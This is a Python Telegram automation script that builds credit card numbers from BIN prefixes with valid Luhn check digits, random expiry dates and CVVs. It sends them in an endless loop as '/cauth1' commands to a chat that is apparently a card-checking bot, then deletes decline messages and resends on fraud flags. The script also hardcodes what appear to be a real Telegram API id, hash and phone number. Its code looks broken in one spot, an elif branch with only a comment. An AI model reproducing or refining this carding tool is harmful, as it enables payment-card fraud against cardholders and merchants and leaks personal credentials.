import unicodedata
from telethon import TelegramClient, errors
import asyncio
import os
import random
from datetime import datetime

# Telegram API credentials - replace with your own credentials
api_id = '25686279'
api_hash = '585e642db1018af44e670f344fb616ef'
phone_number = '+639644135150'

# Session name - you can replace this with any name you like
client = TelegramClient('session_name_itsmerjc', api_id, api_hash)

# Luhn algorithm to generate the last check digit
def luhn_residue(digits):
    sum_digits = 0
    for i, digit in enumerate(reversed(digits)):
        n = int(digit)
        if i % 2 == 0:  # Double every second digit
            n = n * 2
            if n > 9:  # If doubling results in a number greater than 9, subtract 9
                n = n - 9
        sum_digits += n
    return (10 - (sum_digits % 10)) % 10

# Generate a credit card number based on the BIN (first 6 digits)
def generate_card_number(bin_format):
    digits = list(bin_format)
    
    # Generate random digits until the length reaches 15 (leaving space for the check digit)
    while len(digits) < 15:
        digits.append(str(random.randint(0, 9)))

    check_digit = luhn_residue(digits)  # Generate Luhn check digit
    digits.append(str(check_digit))
    
    return ''.join(digits)

# Generate random expiry date (MM|YY format), ensuring the date is in the future
def generate_expiry_date():
    current_year = datetime.now().year % 100  # Get the last two digits of the current year (e.g., 24 for 2024)
    current_month = datetime.now().month

    # Generate a future month and year, ensuring the date is valid
    future_year = random.randint(current_year, current_year + 7)  # Random year up to 7 years from now
    if future_year == current_year:
        month = random.randint(current_month, 12)  # Ensure month is not earlier than the current month
    else:
        month = random.randint(1, 12)  # Any valid month for future years

    return f"{str(month).zfill(2)}|{str(future_year).zfill(2)}"

# Generate random CVV (3 digits)
def generate_cvv():
    return str(random.randint(0, 999)).zfill(3)

# Generate card details
def generate_card(bin_format):
    card_number = generate_card_number(bin_format)
    expiry_date = generate_expiry_date()
    cvv = generate_cvv()
    return f"{card_number}|{expiry_date}|{cvv}"

# Generate cards for a list of BINs
def generate_multiple_cards(bin_list):
    cards = []
    for bin_format in bin_list:
        card_details = generate_card(bin_format)
        cards.append(card_details)
    return cards

# Function to read commands (BINs) from a text file
def read_bin_list(filename):
    with open(filename, 'r') as file:
        bins = file.readlines()
    return [bin_format.strip() for bin_format in bins]

# Function to write remaining commands (BINs) to a text file
def write_bin_list(filename, bins):
    with open(filename, 'w') as file:
        for bin_format in bins:
            file.write(bin_format + '\n')

# Function to normalize and check if the message contains the word 'dead', 'expired', or 'risk_threshold'
def contains_declined(text):
    normalized_text = unicodedata.normalize('NFKD', text)
    lower_text = normalized_text.lower()
    return '❌' in lower_text or '⚠️' in lower_text or 'expired' in lower_text or 'risk_threshold' in lower_text or 'antispam' in lower_text or 'cvv2 declined' in lower_text or 'insuffcicient funds' in lower_text or '$cyb' in lower_text

# Function to check if a message ID is already in the file
def is_message_id_saved(filename, message_id):
    if not os.path.exists(filename):
        return False
    with open(filename, 'r') as file:
        saved_data = file.read()
    return f"ID: {message_id}" in saved_data

# Function to write message ID and text to a file if not already saved and contains 'approved'
def write_accepted_message(filename, message_id, message):
    # Create the file if it doesn't exist
    if not os.path.exists(filename):
        with open(filename, 'w') as file:
            pass

    # Check if message is 'approved' and message ID is not saved
    if 'approved' in message.lower() and not is_message_id_saved(filename, message_id):
        with open(filename, 'a') as file:
            file.write(f"ID: {message_id} \n{message}\n\n")

# Function to delete a message
async def delete_message(chat_id, message_id):
    try:
        await client.delete_messages(chat_id, message_id)
        print(f"Deleted message with ID: {message_id}")
    except Exception as e:
        print(f"Failed to delete message: {e}")

# Function to get messages in the chat and delete those that contain 'dead', 'expired', or 'risk_threshold'
async def process_messages(chat_id, last_command):
    try:
        async for message in client.iter_messages(chat_id):
            if message.text and contains_declined(message.text):
                # Resend the last command if 'risk_threshold' is found
                if 'risk_threshold' in message.text.lower():
                    print(f"'risk_threshold' detected. Resending the last command: {last_command}")
                    sent_message = await client.send_message(chat_id, last_command)
                    await delete_message(chat_id, message.id)  # Delete the detected message
                    await delete_message(chat_id, sent_message.id)  # Delete the resent command
                else:
                    await delete_message(chat_id, message.id)  # Delete declined message
            elif message.text:
                # Save non-declined messages that contain 'approved' to a file
                # write_accepted_message('accepted_messages.txt', message.id, message.text)
    except Exception as e:
        print(f"Failed to retrieve messages: {e}")

# Main function that performs all operations
async def main():
    await client.start(phone=phone_number)
    me = await client.get_me()
    print(f"Logged in as: {me.username} ({me.id})")

    chat_id = 'bmb0H9EiKU0YzZl'  # Replace with the correct username or chat ID
    bin_file = 'kido.txt'  # Replace this with the correct filename containing BINs

    # Read the BINs from the file
    bin_list = read_bin_list(bin_file)

    while True:  # Loop to continuously generate and send card details
        for bin_format in bin_list:
            # Generate card details based on the BIN
            card_details = generate_card(bin_format)
            full_command = f"/cauth1 {card_details}"  # Add card details to command

            try:
                sent_message = await client.send_message(chat_id, full_command)
                print(f"Sent: {full_command}")
            except ValueError as e:
                print(f"Failed to send message: {e}")
            except errors.ChatAdminRequiredError:
                print("Bot or user is not an admin in the group.")
                break
            except errors.ChannelPrivateError:
                print("The bot or user has been banned or the group/channel is private.")
                break
            except errors.UserBannedInChannelError:
                print("The user has been banned from sending messages in this group/channel.")
                break
            except errors.FloodWaitError as e:
                print(f"Too many requests. Please wait for {e.seconds} seconds.")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                continue

            # Process messages to delete those that contain 'dead', 'expired', or 'risk_threshold'
            await process_messages(chat_id, full_command)
           

            # Wait before the next iteration
            await asyncio.sleep(60)  # Adjust this delay as needed
            
            # Delete the sent command message
            await delete_message(chat_id, sent_message.id)

# Use the context manager to automatically close the session when done
with client:
    client.loop.run_until_complete(main())
